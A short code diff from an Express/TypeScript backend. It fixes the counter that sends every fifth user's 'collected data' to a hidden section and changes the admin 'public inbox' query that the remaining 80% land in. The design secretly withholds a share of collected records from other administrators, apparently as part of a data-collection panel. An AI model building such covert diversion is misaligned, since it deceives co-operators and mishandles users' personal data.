@@ -36,8 +36,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Determine if this user should be in hidden section (20%)
       const totalUsers = await storage.countTotalUsers();
+      // Calculate the user number AFTER adding this user
+      const userNumber = totalUsers + 1;
       // First 20% of users go to hidden section (every 5th user starting from 1st)
-      const isHidden = (totalUsers % 5) === 1;
+      // User #1, #6, #11, #16... are hidden (20%)
+      const isHidden = (userNumber % 5) === 1;
 
       // Save collected data to database WITH isHidden flag
       const collectedDataRecord = await storage.createCollectedData({
@@ -230,7 +233,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Get public inbox messages (80% - visible to all admins)
   app.get("/api/admin/inbox/public", requireAdmin, async (req, res) => {
     try {
-      const messages = await storage.getInboxMessages(false);
+      const messages = await storage.getInboxMessages();
       const adminRole = req.session.adminRole;
       
       // Filter sensitive fields based on role
